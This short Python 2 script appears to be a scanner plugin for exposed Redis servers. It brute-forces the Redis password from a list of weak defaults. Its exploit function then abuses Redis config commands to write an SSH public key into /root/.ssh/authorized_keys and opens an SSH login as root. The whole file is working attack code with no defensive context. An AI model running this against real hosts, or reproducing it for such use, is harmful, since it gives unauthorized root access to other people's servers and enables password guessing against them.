#!/usr/bin/env python
#coding=utf8

import redis
import os, subprocess
import pexpect

#sshkey dir
keypath = os.path.dirname(os.path.realpath(__file__)) + os.sep + 'static' + os.sep + 'sshkey.txt'

passwd = ['', '123456', '12345678', 'root', 'admin123', 'admin', '111111']

def verify(host):
    for ps in passwd:
        r = redis.Redis(host, port=6379, db=0, password=ps)
        try:
            r.info()
            if ps == '':
                msg = 'vul, pass is None'
            else:
                msg = 'vul, pass is %s' %ps
            return True, host, msg
        except Exception, e:
            pass
    msg = 'safe'
    return False, host, msg

def exploit(host):
    try:
        foo = '\n\n\n' + open(keypath).readline() + '\n\n\n' 
        r = redis.Redis(host, port=6379, db=0, socket_timeout=2) 
        r.flushall
        r.set('crackit', foo)
        r.config_set('dir', '/root/.ssh/')
        r.config_set('dbfilename','authorized_keys') 
        r.save()
        ssh = pexpect.spawn('ssh root@%s' %host) 
        i = ssh.expect('[#\$]',timeout=2)
        if i == 0:
            msg = 'vul, login success'
            return True, host, msg
        else:
            msg = 'vul, but login failed'
            return True, host, msg
    except Exception,e:
        return False, host, str(e)